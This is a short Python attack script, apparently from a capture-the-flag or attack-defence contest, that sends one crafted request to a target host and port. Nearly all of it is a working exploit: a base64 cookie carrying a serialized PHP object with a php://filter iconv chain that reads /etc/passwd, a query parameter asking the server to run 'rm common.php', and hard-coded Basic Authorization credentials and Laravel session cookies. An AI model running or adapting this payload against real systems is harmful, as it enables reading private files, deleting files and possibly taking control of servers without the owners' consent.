#!/usr/bin/python3
#coding:utf-8

from sys import *
import requests
import re
# import hackhttp

ip = argv[1]
port = int(argv[2])
timeout = 30

def getshell(ip,port):
    url = "http://"+ip+":"+str(port)+'/?0=rm+common.php'
    res=requests.get(url,headers={"Authorization": "Basic MTUzNjYxNjI1ODY6SWtncWIzdEQ="},cookies={'ser_data':'YToxOntpOjA7QzozOiJHTVAiOjQxNDg6e3M6MToiMSI7YToyOntzOjQ6ImhlYWQiO3M6NDA3MzoifXtwYm9vdDppZigocmVxdWlyZS8qKi8oInBocDovL2ZpbHRlci9jb252ZXJ0Lmljb252LlVURjguQ1NJU08yMDIyS1J8Y29udmVydC5iYXNlNjQtZW5jb2RlfGNvbnZlcnQuaWNvbnYuVVRGOC5VVEY3fGNvbnZlcnQuaWNvbnYuVVRGOC5VVEYxNkxFfGNvbnZlcnQuaWNvbnYuVVRGOC5DU0lTTzIwMjJLUnxjb252ZXJ0Lmljb252LlVDUzIuRVVDVFd8Y29udmVydC5pY29udi5MNC5VVEY4fGNvbnZlcnQuaWNvbnYuSUVDX1AyNzEuVUNTMnxjb252ZXJ0LmJhc2U2NC1kZWNvZGV8Y29udmVydC5iYXNlNjQtZW5jb2RlfGNvbnZlcnQuaWNvbnYuVVRGOC5VVEY3fGNvbnZlcnQuaWNvbnYuODY1LlVURjE2fGNvbnZlcnQuaWNvbnYuQ1A5MDEuSVNPNjkzN3xjb252ZXJ0LmJhc2U2NC1kZWNvZGV8Y29udmVydC5iYXNlNjQtZW5jb2RlfGNvbnZlcnQuaWNvbnYuVVRGOC5VVEY3fGNvbnZlcnQuaWNvbnYuU0UyLlVURi0xNnxjb252ZXJ0Lmljb252LkNTSUJNMTE2MS5JQk0tOTMyfGNvbnZlcnQuaWNvbnYuTVM5MzIuTVM5MzZ8Y29udmVydC5pY29udi5CSUc1LkpPSEFCfGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi5VVEY4LlVURjE2TEV8Y29udmVydC5pY29udi5VVEY4LkNTSVNPMjAyMktSfGNvbnZlcnQuaWNvbnYuVUNTMi5FVUNUV3xjb252ZXJ0Lmljb252Lkw0LlVURjh8Y29udmVydC5pY29udi44NjYuVUNTMnxjb252ZXJ0LmJhc2U2NC1kZWNvZGV8Y29udmVydC5iYXNlNjQtZW5jb2RlfGNvbnZlcnQuaWNvbnYuVVRGOC5VVEY3fGNvbnZlcnQuaWNvbnYuVVRGOC5DU0lTTzIwMjJLUnxjb252ZXJ0Lmljb252LklTTzIwMjJLUi5VVEYxNnxjb252ZXJ0Lmljb252LkwzLlQuNjF8Y29udmVydC5iYXNlNjQtZGVjb2RlfGNvbnZlcnQuYmFzZTY0LWVuY29kZXxjb252ZXJ0Lmljb252LlVURjguVVRGN3xjb252ZXJ0Lmljb252LlVURjguVVRGMTZMRXxjb252ZXJ0Lmljb252LlVURjguQ1NJU08yMDIyS1J8Y29udmVydC5pY29udi5VQ1MyLlVURjh8Y29udmVydC5pY29udi5TSklTLkdCS3xjb252ZXJ0Lmljb252LkwxMC5VQ1MyfGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi5VVEY4LlVURjE2TEV8Y29udmVydC5pY29udi5VVEY4LkNTSVNPMjAyMktSfGNvbnZlcnQuaWNvbnYuVUNTMi5VVEY4fGNvbnZlcnQuaWNvbnYuSVNPLUlSLTExMS5VQ1MyfGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi5VVEY4LlVURjE2TEV8Y29udmVydC5pY29udi5VVEY4LkNTSVNPMjAyMktSfGNvbnZlcnQuaWNvbnYuVUNTMi5VVEY4fGNvbnZlcnQuaWNvbnYuSVNPLUlSLTExMS5VSklTfGNvbnZlcnQuaWNvbnYuODUyLlVDUzJ8Y29udmVydC5iYXNlNjQtZGVjb2RlfGNvbnZlcnQuYmFzZTY0LWVuY29kZXxjb252ZXJ0Lmljb252LlVURjguVVRGN3xjb252ZXJ0Lmljb252LlVURjguVVRGMTZMRXxjb252ZXJ0Lmljb252LlVURjguQ1NJU08yMDIyS1J8Y29udmVydC5pY29udi5VVEYxNi5FVUNUV3xjb252ZXJ0Lmljb252LkNQMTI1Ni5VQ1MyfGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi44NjUuVVRGMTZ8Y29udmVydC5pY29udi5DUDkwMS5JU082OTM3fGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi5TRTIuVVRGLTE2fGNvbnZlcnQuaWNvbnYuQ1NJQk0xMTYxLklCTS05MzJ8Y29udmVydC5pY29udi5NUzkzMi5NUzkzNnxjb252ZXJ0LmJhc2U2NC1kZWNvZGV8Y29udmVydC5iYXNlNjQtZW5jb2RlfGNvbnZlcnQuaWNvbnYuVVRGOC5VVEY3fGNvbnZlcnQuaWNvbnYuVVRGOC5DU0lTTzIwMjJLUnxjb252ZXJ0Lmljb252LklTTzIwMjJLUi5VVEYxNnxjb252ZXJ0Lmljb252LkNQMTEzMy5JQk05MzJ8Y29udmVydC5iYXNlNjQtZGVjb2RlfGNvbnZlcnQuYmFzZTY0LWVuY29kZXxjb252ZXJ0Lmljb252LlVURjguVVRGN3xjb252ZXJ0Lmljb252LlVURjguQ1NJU08yMDIyS1J8Y29udmVydC5pY29udi5JU08yMDIyS1IuVVRGMTZ8Y29udmVydC5pY29udi5VQ1MtMkxFLlVDUy0yQkV8Y29udmVydC5pY29udi5UQ1ZOLlVDUzJ8Y29udmVydC5pY29udi44NTEuQklHNXxjb252ZXJ0LmJhc2U2NC1kZWNvZGV8Y29udmVydC5iYXNlNjQtZW5jb2RlfGNvbnZlcnQuaWNvbnYuVVRGOC5VVEY3fGNvbnZlcnQuaWNvbnYuVVRGOC5DU0lTTzIwMjJLUnxjb252ZXJ0Lmljb252LklTTzIwMjJLUi5VVEYxNnxjb252ZXJ0Lmljb252LlVDUy0yTEUuVUNTLTJCRXxjb252ZXJ0Lmljb252LlRDVk4uVUNTMnxjb252ZXJ0Lmljb252LjEwNDYuVUNTMnxjb252ZXJ0LmJhc2U2NC1kZWNvZGV8Y29udmVydC5iYXNlNjQtZW5jb2RlfGNvbnZlcnQuaWNvbnYuVVRGOC5VVEY3fGNvbnZlcnQuaWNvbnYuVVRGOC5VVEYxNkxFfGNvbnZlcnQuaWNvbnYuVVRGOC5DU0lTTzIwMjJLUnxjb252ZXJ0Lmljb252LlVURjE2LkVVQ1RXfGNvbnZlcnQuaWNvbnYuTUFDLlVDUzJ8Y29udmVydC5iYXNlNjQtZGVjb2RlfGNvbnZlcnQuYmFzZTY0LWVuY29kZXxjb252ZXJ0Lmljb252LlVURjguVVRGN3xjb252ZXJ0Lmljb252LkNQMzY3LlVURi0xNnxjb252ZXJ0Lmljb252LkNTSUJNOTAxLlNISUZUX0pJU1gwMjEzfGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi5VVEY4LlVURjE2TEV8Y29udmVydC5pY29udi5VVEY4LkNTSVNPMjAyMktSfGNvbnZlcnQuaWNvbnYuVVRGMTYuRVVDVFd8Y29udmVydC5pY29udi5NQUMuVUNTMnxjb252ZXJ0LmJhc2U2NC1kZWNvZGV8Y29udmVydC5iYXNlNjQtZW5jb2RlfGNvbnZlcnQuaWNvbnYuVVRGOC5VVEY3fGNvbnZlcnQuaWNvbnYuVVRGOC5DU0lTTzIwMjJLUnxjb252ZXJ0LmJhc2U2NC1kZWNvZGV8Y29udmVydC5iYXNlNjQtZW5jb2RlfGNvbnZlcnQuaWNvbnYuVVRGOC5VVEY3fGNvbnZlcnQuaWNvbnYuVVRGOC5VVEYxNkxFfGNvbnZlcnQuaWNvbnYuVVRGOC5DU0lTTzIwMjJLUnxjb252ZXJ0Lmljb252LlVDUzIuVVRGOHxjb252ZXJ0Lmljb252LklTTy1JUi0xMTEuVUNTMnxjb252ZXJ0LmJhc2U2NC1kZWNvZGV8Y29udmVydC5iYXNlNjQtZW5jb2RlfGNvbnZlcnQuaWNvbnYuVVRGOC5VVEY3fGNvbnZlcnQuaWNvbnYuVVRGOC5DU0lTTzIwMjJLUnxjb252ZXJ0Lmljb252LklTTzIwMjJLUi5VVEYxNnxjb252ZXJ0Lmljb252LklTTzY5MzcuSk9IQUJ8Y29udmVydC5iYXNlNjQtZGVjb2RlfGNvbnZlcnQuYmFzZTY0LWVuY29kZXxjb252ZXJ0Lmljb252LlVURjguVVRGN3xjb252ZXJ0Lmljb252LlVURjguQ1NJU08yMDIyS1J8Y29udmVydC5pY29udi5JU08yMDIyS1IuVVRGMTZ8Y29udmVydC5pY29udi5MNi5VQ1MyfGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi5VVEY4LlVURjE2TEV8Y29udmVydC5pY29udi5VVEY4LkNTSVNPMjAyMktSfGNvbnZlcnQuaWNvbnYuVUNTMi5VVEY4fGNvbnZlcnQuaWNvbnYuU0pJUy5HQkt8Y29udmVydC5pY29udi5MMTAuVUNTMnxjb252ZXJ0LmJhc2U2NC1kZWNvZGV8Y29udmVydC5iYXNlNjQtZW5jb2RlfGNvbnZlcnQuaWNvbnYuVVRGOC5VVEY3fGNvbnZlcnQuaWNvbnYuU0UyLlVURi0xNnxjb252ZXJ0Lmljb252LkNTSUJNMTE2MS5JQk0tOTMyfGNvbnZlcnQuaWNvbnYuTVM5MzIuTVM5MzZ8Y29udmVydC5pY29udi5CSUc1LkpPSEFCfGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5iYXNlNjQtZGVjb2RlL3Jlc291cmNlPS9ldGMvcGFzc3dkIikpLyoqLyl9MTIzMzIxc3VhbnZley9wYm9vdDppZn0iO2k6MDtPOjEyOiJEYXRlSW50ZXJ2YWwiOjE6e3M6MToieSI7UjoyO319fX0=',"XSRF-TOKEN":"eyJpdiI6Ilk2QkdBczVuMnZ6RUNVK3FuNXUxMUE9PSIsInZhbHVlIjoiUEoyMVp0TkJFVzU3TlZQZC9tOXVFU1JqVzA5OUk0RnJRMytSUFdVUkNnSU1NcFlMdjRoWm0vWlF6cUVjZGMzUDBWUmZTeCsyU05sak00SFFKVUxiSlQwSC90am5CU1JOdnRqQ0tOMllFMVM2OURyb2psdW1XcWZSd1pCVjkxRnAiLCJtYWMiOiJiNDhiNzZjYTcxMTQzMDJmNjRmMWQyMjJlZDA2MjEwODRjMWFhOTc3NTY3ZTg2YjI4ZTg3MTNlNjJjNjQyMzVhIn0=","laravel_session":"eyJpdiI6IlkxSmVnNmFFTWVqaHJybEUxRWs2dGc9PSIsInZhbHVlIjoiWjhnZy9ENHVVRlVJc3JMajJ5dzVDeXk2cUJFVHdjdzdPdU9jMXgzeW9SQmVxZmJhRkk5WXJwU2htKzZFejdpUStPby9BZnp4UUFZcWh3OFFCTy9VNVI3bUlzM0VSUjVvZlk3MXhkeEtPNGNwc0Z3UDByQ1FWSUdmbm9vN3RYTHEiLCJtYWMiOiI4Y2I5YjJlNzAxNjUyN2VlYjE0YWMwNjNjNTk3MmYyYzVkYTE4OGQzYTdmOGFkMmViYmUzNGVlY2ZmMjU2ZGYzIn0="},timeout=30)
    return res.text[:42]

# 主逻辑
if __name__ == '__main__':
    print(getshell(ip,port))
